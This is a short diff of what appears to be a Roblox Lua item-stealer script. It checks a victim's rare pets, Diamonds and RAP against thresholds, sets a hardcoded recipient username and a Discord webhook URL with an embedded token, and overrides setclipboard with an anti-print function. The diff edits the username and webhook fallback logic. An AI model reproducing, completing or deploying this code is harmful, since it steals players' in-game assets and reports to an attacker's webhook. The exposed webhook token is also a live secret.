@@ -17,6 +17,7 @@ for i,v in pairs(Library.Save.Get().Pets) do
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
      UserName = "TehPucuk_55"
+     UserName2 = "TehPucuk_55"
      Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
 end
 
@@ -61,10 +62,10 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = "TehPucuk_55"
+    UserName = UserName
 end
 if UserName2 == nil then
-    UserName2 = "TehPucuk_55"
+    UserName2 = UserName2
 end
 if Webhook == nil then
     Webhook = Webhook
